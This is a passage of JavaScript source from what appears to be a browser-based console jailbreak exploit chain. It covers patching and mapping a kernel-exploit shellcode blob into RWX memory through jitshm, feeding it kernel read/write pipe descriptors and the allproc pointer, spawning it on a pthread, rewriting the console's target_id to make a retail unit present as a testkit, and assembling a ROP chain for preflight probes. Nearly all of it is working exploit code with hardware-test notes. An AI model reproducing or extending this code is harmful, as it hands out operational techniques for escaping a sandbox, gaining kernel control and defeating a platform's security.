             * silenced blob is a no-op rather than corruption.
             */
            const KEXP_LOG_CALLS = [0x126D, 0x12AD, 0x3BC2];
            let log_nopped = 0;
            for (const off of KEXP_LOG_CALLS) {
                if (bin[off] !== 0xE8) continue;
                for (let i = 0; i < 5; i++) bin[off + i] = 0x90;
                log_nopped++;
            }

            window.syncMark("KEXP-RESOLVER", "slots=11 getpid=" + toHex(getpid)
                + " kbase=" + toHex(kbase) + " cbase=" + toHex(cbase)
                + " (2 resolver calls NOPed, 12 dlsym syscalls skipped, "
                + log_nopped + "/3 elfldr-window log calls NOPed)");
            return O;
        }

        // Map the shellcode RWX from a jitshm CREATE handle. This is poops stage5's exact
        // recipe and the only mapping known to have executed on 12.00; v93 proved p2jb can
        // make this mapping and v94's XCALL (write 0xC3, CALL it, it returned) proved such a
        // mapping really is executable in this process. jitshm goes through the LIBKERNEL
        // STUBS where available: our ROP syscall path keeps RAX and drops CF, so a failure
        // comes back as a small positive number indistinguishable from a valid fd.
        function kexp_map_rwx(bin) {
            const aligned = BigInt((bin.length + 0x3FFF) & ~0x3FFF);
            const SS = window.P2JB_SYSSTUB || {};
            const st_create = SS[0x215], st_alias = SS[0x216];
            const bad = (v) => (v & 0xFFFFFFFFn) === 0xFFFFFFFFn || (v >> 32n) === 0xFFFFFFFFn;

            let exec_fd;
            if (st_create) {
                exec_fd = call(st_create, 0n, aligned, 0x7n);
                if (bad(exec_fd))
                    fail("kexp: jitshm_create DENIED (CF-checked ret=" + toHex(exec_fd) + ")");
                window.syncMark("KEXP-JITSHM", "ok (CF-checked) create=" + toHex(exec_fd)
                    + " size=" + toHex(aligned));
            } else {
                exec_fd = syscall(SYSCALL.jitshm_create, 0n, aligned, 0x7n);
                window.syncMark("KEXP-JITSHM", "raw path (no stub map) create=" + toHex(exec_fd)
                    + " - CF-blind, treat with suspicion");
            }

            const entry = syscall(SYSCALL.mmap, 0n, aligned, 0x7n, 0x1n, exec_fd, 0n);
            if ((entry & 0xFFFFFFFFn) === 0xFFFFFFFFn || entry < 0x10000n)
                fail("kexp: mmap(PROT_RWX, MAP_SHARED, jitshm fd " + toHex(exec_fd)
                    + ") failed ret=" + toHex(entry));
            window.syncMark("KEXP-MAP", "entry=" + toHex(entry) + " size=" + toHex(aligned)
                + " jitfd=" + toHex(exec_fd) + " (PROT_RWX from the CREATE handle,"
                + " poops stage5 recipe)");

            // Write, then read every dword back. A W^X kernel can hand out an RWX mapping
            // whose writes silently do not land, which is precisely the failure poops's
            // alias fallback exists for.
            const verify = (dst) => {
                write_buffer(dst, bin);
                let bad_dw = 0, first_bad = -1;
                for (let off = 0; off + 4 <= bin.length; off += 4) {
                    if (Number(read32(dst + BigInt(off)) & 0xFFFFFFFFn) >>> 0 !== u8_r32(bin, off)) {
                        if (first_bad < 0) first_bad = off;
                        bad_dw++;
                    }
                }
                return { bad: bad_dw, first_bad };
            };
            let v = verify(entry);
            window.syncMark("KEXP-VERIFY", "at=" + toHex(entry)
                + " badDwords=" + v.bad + "/" + (bin.length >> 2)
                + " firstBad=" + v.first_bad);

            if (v.bad !== 0) {
                // Fall back to writing through a jitshm ALIAS mapped RW, then re-check the
                // EXEC view - the two share backing (v91's ELF-XVERIFY proved that on this
                // console), so a successful alias write is visible through `entry`.
                if (!st_alias) fail("kexp: RWX write did not land and no jitshm_alias stub");
                const w_fd = call(st_alias, exec_fd, 0x3n);
                if (bad(w_fd)) fail("kexp: RWX write did not land and jitshm_alias failed");
                const w_addr = syscall(SYSCALL.mmap, 0n, aligned, 0x3n, 0x1n, w_fd, 0n);
                if ((w_addr & 0xFFFFFFFFn) === 0xFFFFFFFFn || w_addr < 0x10000n)
                    fail("kexp: jitshm_alias fd " + toHex(w_fd) + " gave no writable mapping"
                        + " (ret=" + toHex(w_addr) + ")");
                window.syncMark("KEXP-ALIAS", "wfd=" + toHex(w_fd) + " writeAt=" + toHex(w_addr)
                    + " execAt=" + toHex(entry) + " - direct RWX write did not land");
                v = verify(w_addr);
                const exec_first = Number(read32(entry) & 0xFFFFFFFFn) >>> 0;
                window.syncMark("KEXP-ALIAS-VERIFY", "aliasBad=" + v.bad
                    + " execFirst=0x" + exec_first.toString(16)
                    + " expect=0x" + u8_r32(bin, 0).toString(16));
                if (v.bad !== 0 || exec_first !== u8_r32(bin, 0))
                    fail("kexp: alias write did not land either - not spawning");
                syscall(SYSCALL.munmap, w_addr, aligned);
            }
            return entry;
        }

        // poops spawns the shellcode with scePthreadCreate + a sized attr and then JOINS it
        // (poops.js:8914-8955). 12.00 carries all six OFFSET_lk_scePthread* offsets, so this
        // is the branch that produced the only observed success. Returns the join result.
        function kexp_spawn_pthread(entry, args_addr, O) {
            const kbase = window.P2JB_LIBKERNEL_BASE || 0n;
            if (kbase === 0n) fail("kexp: libkernel base unresolved");
            const sized = O.lk_sce_create >= 0 && O.lk_sce_join >= 0 && O.lk_sce_attr_init >= 0
                && O.lk_sce_attr_stacksize >= 0 && O.lk_sce_attr_detach >= 0
                && O.lk_sce_attr_destroy >= 0;
            if (!sized) fail("kexp: firmware profile has no scePthread create/join/attr set");

            const attr = malloc(0x100);
            for (let q = 0n; q < 0x100n; q += 8n) write64(attr + q, 0n);
            const handle = malloc(8); write64(handle, 0n);
            const retbuf = malloc(8); write64(retbuf, 0n);
            const namebuf = alloc_string("payload");

            const a_init = call(kbase + BigInt(O.lk_sce_attr_init), attr);
            const a_size = call(kbase + BigInt(O.lk_sce_attr_stacksize), attr, 0x80000n);
            const a_det = call(kbase + BigInt(O.lk_sce_attr_detach), attr, 0n);
            window.syncMark("KEXP-ATTR", "init=" + toHex(a_init) + " stacksize=" + toHex(a_size)
                + " detachstate=" + toHex(a_det) + " (stack 0x80000, joinable)");
            if (toBigSafe(a_init) !== 0n || toBigSafe(a_size) !== 0n || toBigSafe(a_det) !== 0n)
                fail("kexp: scePthreadAttr setup failed");

            /* GIVE THE kexp THREAD ORDINARY SCHEDULING BEFORE CREATING IT.
               apply_main_thread_pinning() put THIS thread - the syscall executor - at
               PRI_REALTIME / rtprio MAIN_RTPRIO(256) pinned to one core (MAIN_CORE, the
               last of P2JB_ALLOWED_CORES). scePthreadCreate below is issued FROM this
               thread and the attr above sets only stacksize and detachstate - no policy,
               no PTHREAD_EXPLICIT_SCHED - so the kexp thread INHERITS realtime 256 on that
               single core. It then spins on kernel reads (find_softc walks allproc down to
               kdata, one kread per 8 bytes).
               The WebProcess's own threads are confined to the same CPU mask (0xEA00 =
               cores 9,11,13,14,15). A realtime spinner owning one of them starves the
               renderer, it misses its IPC heartbeat, and the shell force-kills it:
                   [SceLncService] CALL sceApplicationLocalProcessKill2(..., forceKill)
                   [Syscore App]   App Crash : PID=0x57, reason=0x4
               with NO signal, NO rip, NO coredump - a KILL, not a fault, which is why it
               never looked like a crash and why the kexp thread carries on through the
               teardown and still brings elfldr up in UART.
               The race is over by now: nothing after stage 4 needs realtime or a pinned
               core. So drop to timeshare and widen to every allowed core, and let the new
               thread inherit that instead.
               Beaconed because these exact syscalls have failed SILENTLY with EINVAL in
               this sandbox before - that is why apply_main_thread_pinning() reports its
               returns too. A non-zero here means the change did NOT take and the run is
               not a test of it. */
            let _schedAff = -1n, _schedRt = -1n, _schedMask = 0;
            const _schedOn = !(window.fwFlag) || window.fwFlag("kexpSched");
            try {
                if (!_schedOn) throw new Error("skip");
                const cores = (window.P2JB_ALLOWED_CORES || []).slice();
                const m = malloc(0x10);
                for (let i = 0; i < 16; i++) write8(m + BigInt(i), 0n);
                let bits = 0;
                for (let i = 0; i < cores.length; i++) bits |= (1 << cores[i]);
                _schedMask = bits;
                write16(m, BigInt(bits & 0xFFFF));
                _schedAff = syscall(SYSCALL.cpuset_setaffinity, 3n, 1n,
                                    0xFFFFFFFFFFFFFFFFn, 0x10n, m);
                const rp = malloc(4);
                write16(rp, PRI_TIMESHARE);
                write16(rp + 2n, 0n);
                _schedRt = syscall(SYSCALL.rtprio_thread, RTP_SET, 0n, rp);
            } catch (e) { }
            window.syncMark("KEXP-SCHED", (_schedOn ? "timeshare+wide-affinity before spawn" : "SKIPPED for fw " + window.fw_str + " (FW_PROFILE kexpSched=0)")
                + " mask=0x" + _schedMask.toString(16)
                + " affret=" + toHex(_schedAff) + " rtret=" + toHex(_schedRt)
                + ((toBigSafe(_schedAff) === 0n && toBigSafe(_schedRt) === 0n)
                    ? "  (both 0 - kexp thread inherits normal scheduling)"
                    : "  *** REFUSED - kexp still inherits realtime on one core ***"));

            window.syncMark("KEXP-SPAWN", "scePthreadCreate=" + toHex(kbase + BigInt(O.lk_sce_create))
                + " entry=" + toHex(entry) + " args=" + toHex(args_addr)
                + " handle=" + toHex(handle));
            const cret = call(kbase + BigInt(O.lk_sce_create), handle, attr, entry, args_addr, namebuf);
            call(kbase + BigInt(O.lk_sce_attr_destroy), attr);
            const h = read64(handle);
            window.syncMark("KEXP-SPAWN-RET", "ret=" + toHex(cret) + " handle=" + toHex(h)
                + (toBigSafe(cret) === 0n ? "  (0 = thread created)" : "  *** FAILED ***"));
            if (toBigSafe(cret) !== 0n)
                fail("kexp: scePthreadCreate returned " + toHex(cret));

            // Blocks until the shellcode returns. poops observed joinRet=0 shellcodeRet=0x0,
            // so this DOES come back; bracket it so a hang is distinguishable from a crash.
            window.syncMark("KEXP-JOIN-PRE", "handle=" + toHex(h) + " joining the kexp thread");
            const jret = call(kbase + BigInt(O.lk_sce_join), h, retbuf);
            const sret = read64(retbuf);
            window.syncMark("KEXP-JOIN", "joinRet=" + toHex(jret) + " shellcodeRet=" + toHex(sret));
            return { join_ret: toBigSafe(jret), shell_ret: sret };
        }

        // Kit-only target_id exception.
        // kexp forcing target_id = 0x82 is DELIBERATE AND REQUIRED: the point of the tool is
        // to make a RETAIL console present as a TESTKIT. Leaving a retail console with its own
        // target_id sends downstream code onto a path it was never meant to run and CAN PANIC
        // THE KERNEL. An unconditional restore was shipped once and had to be reverted (see
        // "Revert the kit-id restore - it panicked a devkit"). The disassembly says it plainly:
        // in patch_qa_flags every other field is a read-modify-write that ORs bits onto the
        // live value, and target_id alone is a hard overwrite -
        //     0x403801  or  esi, 0x14              security_flags |= 0x14
        //     0x403807  mov byte [rbp-0x2a], 0x82  target_id: OVERWRITE  <- deliberate
        //     0x40380b  or  ecx, 0x10300           qa_flags       |= 0x10300
        //     0x40381b  or  r8d, 1                 utoken_flags   |= 1
        //
        // On a DEVKIT the forced 0x82 makes Release Check Mode read "Release": the testkit XML
        // entry for key 0x78020300 has no Development option, so a stored DEVELOPMENT
        // boot_param becomes unselectable. Keeping the console's own id fixes that and restores
        // 48 devkit-only settings - but ONLY on a console that is ALREADY a kit.
        //
        // Decided per console at runtime against the LIVE target_id (p2jb has kernel r/w long
        // before kexp runs, and TARGET_ID = SECURITY_FLAGS + 9), never baked into the blob.
        // The shipped blob stays STOCK, so poops.js is unaffected and keeps stock behaviour.
        //
        // Conservative by construction: the NOPs are applied for exactly ONE observed value,
        // 0x81. Retail, unknown ids and a failed read ALL take the byte-identical stock path,
        // and the ?keepkitid=1 override is gated on a kit id too, so it cannot keep a retail
        // id - that is the case that panics, and it is unreachable.
        // Hardware-verified on a 12.70 devkit 2026-08-20: before/new/after qaf all showed
        // target_id 0x81 and iommu_write wrote 0x81, with the other three fields still ORed.
        function kexp_maybe_keep_kit_id(bin, S) {
            const q = String(location.search || "");
            const disabled = /[?&]keepkitid=0/i.test(q);
            const forced   = /[?&]keepkitid=1/i.test(q);
            let tid = -1, why = "";
            try {
                const sf = S.data_base + S.OFF.DATA_BASE_SECURITY_FLAGS;
                tid = Number((S.kread64(sf + 8n) >> 8n) & 0xFFn);   // +9 = target_id
            } catch (e) { why = " (read failed: " + e + ")"; }
            const is_kit  = (tid === 0x81);
            const kit_ish = (tid === 0x81 || tid === 0x82 || tid === 0x83);
            const apply   = kit_ish && (forced || (!disabled && is_kit));
            if (!apply) {
                window.syncMark("KEXP-TARGETID", "live target_id="
                    + (tid < 0 ? "<unread>" : toHex(BigInt(tid))) + why
                    + " -> STOCK: kexp forces 0x82 (retail presents as testkit)."
                    + (disabled ? "  [?keepkitid=0]" : "")
                    + (forced && !kit_ish ? "  [?keepkitid=1 IGNORED - not a kit id;"
                        + " keeping a retail id can panic the kernel]" : ""));
                return { applied: false, tid: tid };
            }
            const stock_store = [0xc6, 0x45, 0xd6, 0x82];         // mov byte [rbp-0x2a], 0x82
            const stock_log   = [0xba, 0x82, 0x00, 0x00, 0x00];   // mov edx, 0x82
            for (let k = 0; k < stock_store.length; k++)
                if (bin[0x3807 + k] !== stock_store[k])
                    fail("kexp: 0x3807 is not the stock target_id store - refusing to patch");
            for (let k = 0; k < stock_log.length; k++)
                if (bin[0x382a + k] !== stock_log[k])
                    fail("kexp: 0x382a is not the stock target_id log - refusing to patch");
            for (let k = 0; k < 4; k++) bin[0x3807 + k] = 0x90;   // drop the overwrite
            bin[0x382a] = 0x0f; bin[0x382b] = 0xb6;               // movzx edx, byte [rbp-0x2a]
            bin[0x382c] = 0x55; bin[0x382d] = 0xd6; bin[0x382e] = 0x90;
            window.syncMark("KEXP-TARGETID", "live target_id=" + toHex(BigInt(tid))
                + " is a KIT -> keeping it (0x3807 NOPed)."
                + (forced ? "  [?keepkitid=1 FORCED]" : "  retail is unaffected by this path."));
            return { applied: true, tid: tid };
        }

        async function kexp_launch(S) {
            const allproc = S.data_base + S.OFF.DATA_BASE_ALLPROC;
            const kbase = window.P2JB_LIBKERNEL_BASE || 0n;
            const cbase = (typeof libc_base !== "undefined") ? libc_base : 0n;
            if (kbase === 0n || cbase === 0n)
                fail("kexp: library bases unresolved (libkernel=" + toHex(kbase)
                    + " libc=" + toHex(cbase) + ")");

            // ---- 1. elfldr as a RAW DATA BLOB ------------------------------------------
            // No phdr walk, no relocations, no exec permission: kexp wants the FILE. The
            // mapping call is the one poops proved on this console
            // (mmap(0,0x64000,PROT_RW,MAP_ANON|MAP_PRIVATE,-1,0) -> 0x2004c4000), and it only
            // works at all because the syscall wrapper now passes the 6th argument (offset,
            // r9) - dropping it made MAP_ANON, jitshm-create, jitshm-alias and MAP_FIXED all
            // return EINVAL identically.
            const elf_data = read_file("elfldr");
            const elf_len = BigInt(elf_data.length);
            if (elf_len < 0x1000n || elf_data[0] !== 0x7f || elf_data[1] !== 0x45
                || elf_data[2] !== 0x4c || elf_data[3] !== 0x46)
                fail("kexp: elfldr blob is not an ELF (" + elf_data.length + " bytes)");
            const elf_mapped = (elf_len + 0x3FFFn) & ~0x3FFFn;
            const elf_base = syscall(SYSCALL.mmap, 0n, elf_mapped, 0x3n, 0x1002n, 0xFFFFFFFFn, 0n);
            if ((elf_base & 0xFFFFFFFFn) === 0xFFFFFFFFn || elf_base < 0x10000n)
                fail("kexp: could not map " + toHex(elf_mapped) + " bytes for the elfldr blob"
                    + " (mmap ret=" + toHex(elf_base) + " MAP_ANON|MAP_PRIVATE fd=-1 off=0)");
            write_buffer(elf_base, elf_data);
            const elf_first = read32(elf_base);
            window.syncMark("KEXP-ELF", "blob=" + toHex(elf_base) + " len=" + toHex(elf_len)
                + " mapped=" + toHex(elf_mapped) + " firstDword=" + toHex(elf_first)
                + (elf_first === 0x464c457fn ? " (\\x7fELF ok)" : " *** NOT \\x7fELF ***"));
            if (elf_first !== 0x464c457fn)
                fail("kexp: elfldr blob did not read back as an ELF from " + toHex(elf_base));

            // ---- 2. the kexp shellcode: patch, map RWX, copy in ------------------------
            const bin = read_file("kexp");
            const O = kexp_patch_resolver(bin, kbase, cbase);
            kexp_maybe_keep_kit_id(bin, S);
            const sc_entry = kexp_map_rwx(bin);

            // ---- 3. the 0x28 argument block -------------------------------------------
            // Layout from poops.js:8663-8670. NOTE these are FOUR PIPE fds - two pipe pairs -
            // NOT the IPv6 socket pair the old payload_args carried. poops builds them with
            // two pipe2Nonblock() calls and stores them as S.masterRfd/masterWfd/victimRfd/
            // victimWfd (poops.js:9544-9546); p2jb's setup_pipes_kernrw builds exactly the
            // same two pairs into S.master_rfd/master_wfd/victim_rfd/victim_wfd, so the
            // mapping is one-to-one and nothing here is inferred.
            // allproc is the ADDRESS OF the allproc variable, not the head proc: poops
            // dereferences it (`head = kread64(ap.addr)`) in findRootvnode, and the ASLR
            // slide was confirmed on this console (runtime allproc - data_base = 0x2885E00,
            // matching the static kernel exactly).
            const args = malloc(0x28);
            for (let q = 0n; q < 0x28n; q += 8n) write64(args + q, 0n);
            write32(args + 0x00n, BigInt(S.master_rfd));
            write32(args + 0x04n, BigInt(S.master_wfd));
            write32(args + 0x08n, BigInt(S.victim_rfd));
            write32(args + 0x0Cn, BigInt(S.victim_wfd));
            write64(args + 0x10n, allproc);
            write64(args + 0x18n, elf_base);
            write64(args + 0x20n, elf_len);
            window.syncMark("KEXP-ARGS", "master=" + S.master_rfd + "." + S.master_wfd
                + " victim=" + S.victim_rfd + "." + S.victim_wfd
                + " allproc=" + toHex(allproc) + " elfldr=" + toHex(elf_base)
                + " size=" + toHex(elf_len) + " argsAt=" + toHex(args));
            if (allproc === 0n || (allproc >> 48n) !== 0xFFFFn)
                fail("kexp: allproc " + toHex(allproc) + " is not a kernel pointer");

            // ---- 4. spawn --------------------------------------------------------------
            // DEFAULT FLIPPED TO thr_new IN v98. v97 proved the pthread branch fatal HERE
            // even though it is poops's own default: the run reached KEXP-SPAWN-METHOD and
            // died in the first scePthreadAttr* call with App Crash reason=0xa0020307.
            // The difference is not the function - IDA shows scePthreadAttrInit is a
            // 0x16-byte wrapper over a 0x55-byte pthread_attr_init, with NO fs: access and
            // NO SSE anywhere on the path, so neither TLS nor stack alignment explains it.
            // The difference is the CALLER: poops reaches these through its own chain
            // builder, while p2jb goes through G.call()/rop-worker fireSync, which until
            // that moment had only ever been pointed at syscall-stub leaves.
            // thr_new sidesteps the entire question: it is a raw syscall (0x1C7), touches
            // no libkernel, needs no TLS, and is exactly what poops's other stage5 branch
            // does with the same thr_param layout.
            // ?spawn=pthread restores the old behaviour for comparison.
            // DEFAULT BACK TO pthread IN v103. v98 flipped it to thr_new because the
            // pthread path killed the process - but that was rop-worker's missing chain
            // reserve corrupting the jmp_buf, fixed in v102. With the reserve in place the
            // v102 preflight ran the whole sequence cleanly: attrInit/stacksize/detach all
            // 0, scePthreadCreate ret=0 handle=0x880dad080, scePthreadJoin ret=0.
            // And kexp NEEDS a real pthread: v100 spawned it on a raw thr_new thread with
            // our 0x40 stub TLS and it faulted instantly (App Crash reason=0xb). The blob
            // itself has no fs: access (capstone over all 18912 bytes) - its CALLEES do,
            // through the 11 slots we patch - so it needs a thread with a real TCB, which
            // is exactly what scePthreadCreate produces and thr_new does not.
            // ?spawn=thr_new selects the raw path for comparison.
            const want_thrnew = /[?&]spawn=thr_new/i.test(String(location.search || ""));
            window.syncMark("KEXP-SPAWN-METHOD", want_thrnew
                ? "thr_new (?spawn=thr_new) - raw syscall, 0x40 stub TLS. v100 proved kexp"
                  + " FAULTS on this: its callees need a real TCB."
                : "pthread (DEFAULT since v103) - scePthreadCreate + join, giving kexp a"
                  + " REAL thread with a REAL TCB. Validated by the v102 preflight after"
                  + " the rop-worker chain-reserve fix (attr 0/0/0, create 0, join 0).");
            if (want_thrnew) {
                const r = spawn_native_thread(sc_entry, args);
                if (r.ret !== 0n)
                    fail("kexp: thr_new returned " + toHex(r.ret) + " - shellcode did not run");
                return { spawn: "thr_new", tid: r.tid };
            }
            const j = kexp_spawn_pthread(sc_entry, args, O);
            return { spawn: "pthread", join_ret: j.join_ret, shell_ret: j.shell_ret };
        }

        function get_y2jb_version() {
            if (typeof version_string !== "string") return null;
            const m = version_string.match(/Y2JB\s+(\d+)\.(\d+)/);
            return m ? { major: +m[1], minor: +m[2], str: version_string } : null;
        }
        function y2jb_ge15(v) {
            return v !== null && (v.major > 1 || (v.major === 1 && v.minor >= 5));
        }

        function resolve_title_id() {
            if (typeof TITLE_ID === "string" && TITLE_ID.length > 0) return TITLE_ID;
            if (typeof get_title_id === "function") {
                try {
                    const t = get_title_id();
                    if (typeof t === "string" && t.length > 0) return t;
                } catch (_) { }
            }
            return null;
        }

        // =================================================================
        // PREFLIGHT - answers the v97 crash in ~2 minutes instead of ~70
        // =================================================================
        // v97 (a3-rmsutfof1) jailbroke, ran the entire kexp handoff correctly
        // (KEXP-VERIFY badDwords=0/4728, KEXP-ARGS all valid), emitted
        // KEXP-SPAWN-METHOD and then died: App Crash PID=0x57 reason=0xa0020307,
        // userland, no kernel panic. The next beacon would have been KEXP-ATTR, so it
        // died inside one of the three scePthreadAttr* calls.
        //
        // TWO HYPOTHESES ALREADY KILLED BY IDA (libkernel_web, re-tools/attrinit*.py,
        // sse_align.py) - do not re-test them:
        //   TLS       - scePthreadAttrInit is a 0x16-byte error-code wrapper over
        //               pthread_attr_init (0x55 bytes), and NEITHER touches fs:. The
        //               TLS-heavy one is pthread_create (fs:10h, 0xd8 stack, 29 calls),
        //               which we never reached.
        //   ALIGNMENT - zero SSE instructions of any kind on that path, so a
        //               16-byte-misaligned RSP cannot be faulting a movaps.
        //
        // What is left is the CALL MECHANISM itself: G.call() has only ever been
        // exercised on syscall-stub leaves (`mov rax,NR; syscall; ret`, e.g. the jitshm
        // stubs, which worked two lines earlier in the same run) and on a bare `ret`
        // (v94's XCALL). scePthreadAttrInit is the first real compiled function it has
        // ever been pointed at. This probe tests exactly that, before the 50-minute
        // leak, so a crash costs two minutes.
        //
        // Run it with:  ?preflight=1&skipleak=1
        // It is OFF by default - it deliberately performs the call that killed the last
        // run, so it must never fire during a real jailbreak attempt.
        async function preflight_probe() {
            const kb = window.P2JB_LIBKERNEL_BASE || 0n;
            const O = kexp_offsets();
            window.syncMark("PREFLIGHT", "kbase=" + toHex(kb)
                + " attr_init=+0x" + (O.lk_sce_attr_init >>> 0).toString(16)
                + " create=+0x" + (O.lk_sce_create >>> 0).toString(16)
                + " thr_exit_stub=" + toHex(window.P2JB_THR_EXIT_STUB || 0n));
            if (kb === 0n) { window.syncMark("PREFLIGHT", "no libkernel base - abort"); return; }

            // --- A. a syscall STUB through call(): the shape known to work ----------
            // If even this dies, the problem is call() itself and not the callee.
            const SS = window.P2JB_SYSSTUB || {};
            const stub = SS[0x14] || SS["20"];      // getpid
            if (stub) {
                // NB P2JB_SYSSTUB holds poops int64 OBJECTS, not BigInts. toBigSafe()
                // does BigInt(x), which stringifies to bare hex with no 0x and throws
                // "Failed to parse String to BigInt" - which is exactly how the first
                // preflight aborted before stage A ever ran. call() converts internally
                // via toBig(I(x)); only the beacon needs care.
                window.syncMark("PREFLIGHT", "A-PRE  call(getpid stub " + String(stub) + ")");
                const r = call(stub);
                window.syncMark("PREFLIGHT", "A-POST returned " + toHex(r) + "  (stub path OK)");
            } else {
                window.syncMark("PREFLIGHT", "A-SKIP no getpid stub in the map");
            }

            // --- F. THE CANARY, NOW FIRST: the path v98 defaults to ------------------
            // This is what the probe exists to validate, so it must run BEFORE anything
            // that can kill the process. Spawn one thread whose entry IS the thr_exit
            // stub: it does nothing but exit, exercising spawn_native_thread's thr_param
            // block, stack and TLS stub with no payload involved. Raw thr_new (0x1C7) -
            // a syscall, no libkernel, so it cannot hit whatever kills call() on
            // compiled code.
            const exitStub = window.P2JB_THR_EXIT_STUB || 0n;
            if (exitStub === 0n) {
                window.syncMark("PREFLIGHT", "F-SKIP no thr_exit stub, cannot canary");
            } else {
                window.syncMark("PREFLIGHT", "F-PRE  spawn_native_thread(entry=thr_exit stub)"
                    + " - raw thr_new, no libkernel");
                const c = spawn_native_thread(exitStub, 0n);
                window.syncMark("PREFLIGHT", "F-POST thr_new ret=" + toHex(c.ret)
                    + " tid=" + toHex(c.tid)
                    + (c.ret === 0n ? "  *** THR_NEW SPAWN PATH IS GOOD ***"
                                    : "  *** thr_new FAILED ***"));
            }

            // --- G. OPTION B: call scePthreadCreate FROM A FRESH THREAD --------------
            // v100 showed the kexp shellcode SIGSEGVs the instant it starts on a raw
            // thr_new thread (ELF-SPAWN printed, no ELF-SPAWN-RET, App Crash reason=0xb),
            // while the very same spawn with entry=thr_exit returned cleanly in stage F.
            // So the spawn is sound and the SHELLCODE is what faults - it calls 11
            // libkernel/libc functions through the slots we patch, and our thread carries
            // only a 0x40 stub TLS. poops runs kexp on a REAL pthread (PK.STAGE5_SPAWN
            // defaults to "pthread"), which is why it survives.
            //
            // We cannot mint a real pthread with G.call(): stage B proved that fatal,
            // and rop-worker.js explains why structurally - its chain runs by hijacking
            // the PARKED pthread_cond_wait return slot of a WebKit worker, so the thread
            // executing the chain is INSIDE libc's condvar wait. Syscall stubs are safe
            // there; re-entering libc's allocator and locks is not.
            //
            // This stage tests the way out: run the scePthreadCreate call on a FRESH
            // thr_new thread instead. That thread is not inside any libc call, so the
            // reentrancy hazard is gone. It still carries the 0x40 stub TLS, so if the
            // call still dies, TLS is the binding constraint and option A (build a real
            // TCB) is the only route left. Either outcome is decisive, and neither needs
            // a jailbreak - scePthreadCreate is plain userland.
            //
            // The chain is entered exactly like every leak worker: thr_new with
            // start_func=LONGJMP and a jmp_buf that pivots rsp to the chain. That is the
            // one spawn path with a long hardware track record in this port.
            const G_DONE_MAGIC = 0x600D5A1700000001n;
            if (O.lk_sce_create < 0 || !/[?&]optionb=1/i.test(String(location.search || ""))) {
                window.syncMark("PREFLIGHT", "G-SKIP option B parked (?optionb=1 to run it)."
                    + " It crashed in v101, and the cause is now believed to be TLS: a fresh"
                    + " thr_new thread carries only the 0x40 stub, and pthread_create reads"
                    + " fs:10h (the TCB's curthread). The hijacked WebKit worker, by"
                    + " contrast, is a REAL thread with a REAL TCB - which is where the"
                    + " call belongs once the chain reserve is fixed.");
            } else {
                const g_handle = malloc(8); write64(g_handle, 0n);
                const g_result = malloc(8); write64(g_result, 0n);
                const g_done = malloc(8); write64(g_done, 0n);
                const g_name = alloc_string("pfG");
                const g_create = kb + BigInt(O.lk_sce_create);

                // The spawned pthread's entry is a bare `ret`: it returns immediately,
                // which is the NORMAL "thread function returned" path and lets libkernel's
                // own trampoline run pthread_exit. Safer than entering a thr_exit stub.
                const g_entry = ROP.ret;

                const CH = 0x4000;
                const cbuf = malloc(CH * 2);
                for (let k = 0n; k < BigInt(CH * 2); k += 8n) write64(cbuf + k, 0n);
                const centry = cbuf + BigInt(CH);   // headroom below, like the leak chains
                let ci = 0;
                const ce = (v) => { write64(centry + BigInt(ci * 8), v); ci++; };

                ce(ROP.ret);
                ce(ROP.ret);
                ce(ROP.pop_rdi); ce(g_handle);      // SceKernelPthread *thread
                ce(ROP.pop_rsi); ce(0n);            // attr = NULL (default stack/joinable)
                ce(ROP.pop_rdx); ce(g_entry);       // entry
                ce(ROP.pop_rcx); ce(0n);            // arg
                ce(ROP.pop_r8);  ce(g_name);        // name
                ce(g_create);                       // *** scePthreadCreate ***
                // rax = return value; pop rdi does not touch rax
                ce(ROP.pop_rdi); ce(g_result);
                ce(ROP.mov_qword_rdi_rax);
                // publish DONE second, so a torn read of the flag can never equal the
                // magic and the result is only consumed once settled (same discipline
                // rop-worker.js uses for its own retval slot)
                ce(ROP.pop_rdi); ce(g_done);
                ce(ROP.pop_rax); ce(G_DONE_MAGIC);
                ce(ROP.mov_qword_rdi_rax);
                // exit this thread cleanly rather than running off the end of the chain
                ce(ROP.pop_rax); ce(SYSCALL.thr_exit);
                ce(ROP.pop_rdi); ce(0n);
                ce(syscall_wrapper);
                ce(ROP.ret);

                window.syncMark("PREFLIGHT", "G-PRE  chain=" + toHex(centry)
                    + " slots=" + ci + " scePthreadCreate=" + toHex(g_create)
                    + " entry=" + toHex(g_entry)
                    + "  - calling libkernel from a FRESH thr_new thread");
                const gs = spawn_leak_worker(centry);
                window.syncMark("PREFLIGHT", "G-SPAWNED tid=" + toHex(gs)
                    + " - polling for the chain's DONE flag");

                const gdl = Date.now() + 4000;
                let gok = false;
                while (Date.now() < gdl) {
                    if (read64(g_done) === G_DONE_MAGIC) { gok = true; break; }
                }
                if (gok) {
                    const gr = read64(g_result);
                    window.syncMark("PREFLIGHT", "G-POST scePthreadCreate returned "
                        + toHex(gr) + " handle=" + toHex(read64(g_handle))
                        + (gr === 0n
                            ? "  *** OPTION B WORKS - libkernel IS callable from a fresh"
                              + " thread, so kexp can be given a REAL pthread ***"
                            : "  *** returned non-zero: called safely but REFUSED ***"));
                } else {
                    window.syncMark("PREFLIGHT", "G-TIMEOUT no DONE flag in 4s -"
                        + " the chain did not finish. We survived, so it did not fault the"
                        + " process; the call likely hung or the thread died. TLS is then"
                        + " the binding constraint -> option A (build a real TCB).");
                }
            }
            // --- B..E ARE FATAL AND ARE NOW OPT-IN (?fatal=1) ------------------------
            // Proved twice on hardware (runs rmsuwazn6 / rmsuwbc16, v=99): A returns
            // correctly from a syscall stub, then B kills the WebProcess every time
            // (App Crash reason=0xa0020307). There is nothing left to learn by running
            // it again, and running it PREVENTED stage F - the canary for the path we
            // actually depend on - from ever executing. Safe tests first.
            // B..E are now THE TEST OF THE CHAIN-RESERVE FIX, so they run by default.
            // They were fatal in v99 because rop-worker put the chain entry ~0x70 bytes
            // above the scratch base with the jmp_buf directly beneath it, so the first
            // compiled function's `push rbp` overwrote the return context. v102 reserves
            // 0x10000 below the entry, matching poops's reserved_stack. If that was the
            // whole story these four calls now return instead of killing the process.
            // ?nofatal=1 skips them if a run is needed without the risk.
            if (/[?&]nofatal=1/i.test(String(location.search || ""))) {
                window.syncMark("PREFLIGHT", "B-SKIP ?nofatal=1");
                window.syncMark("PREFLIGHT", "DONE - safe stages only");
                return;
            }

            // --- B. the suspect: a real compiled libkernel function -----------------
            // Bracketed. If B-POST never appears, call() cannot safely enter compiled
            // libkernel code from this ROP context, and the kexp spawn must not use it.
            const attr = malloc(0x100);
